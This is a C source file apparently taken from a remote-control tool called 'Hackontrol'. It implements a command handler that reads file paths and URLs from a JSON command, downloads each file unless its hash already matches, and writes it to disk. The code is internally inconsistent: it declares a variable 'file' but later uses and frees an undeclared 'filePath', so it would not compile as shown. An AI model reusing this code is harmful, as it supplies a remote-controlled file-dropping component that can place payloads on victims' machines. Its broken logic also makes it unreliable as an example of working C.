#include "execute.h"

static void download(const cJSON* const root) {
	if(!root || !cJSON_IsObject(root)) {
		return;
	}

	LPWSTR file = HackontrolGetFile(root);

	if(!file) {
		return;
	}

	BOOL match = CheckFileHash(root, filePath);

	if(match) {
		goto freeFilePath;
	}

	LPSTR url = KHJSONGetString(root, "url", NULL);

	if(!url) {
		goto freeFilePath;
	}

	DataStream stream = {0};

	if(!HackontrolForceDownload(&stream, url, TRUE)) {
		goto freeFilePath;
	}

	HackontrolWriteFile(filePath, &stream);
	KHDataStreamFree(&stream);
freeFilePath:
	LocalFree(filePath);
}

void ExecuteDownload(const cJSON* const root) {
	cJSON* file = cJSON_GetObjectItem(root, "file");

	if(!file) {
		return;
	}

	if(!cJSON_IsArray(file)) {
		download(file);
		return;
	}

	for(int i = 0; i < cJSON_GetArraySize(file); i++) {
		download(cJSON_GetArrayItem(file, i));
	}
}
